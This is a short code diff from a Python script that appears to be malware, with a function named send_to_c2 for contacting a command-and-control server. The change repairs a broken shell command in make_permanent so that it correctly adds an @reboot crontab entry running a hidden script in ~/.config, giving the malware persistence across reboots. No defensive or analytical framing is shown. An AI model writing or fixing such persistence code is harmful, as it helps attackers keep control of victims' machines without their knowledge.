@@ -93,7 +93,7 @@ def send_to_c2():
         pass
 
 def make_permanent():
-    os.system('crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 ~/.config/setup.py") | crontab -')
+    os.system('crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 ~/.config/setup.py" | crontab -')
 
 if __name__ == "__main__":
     make_permanent()
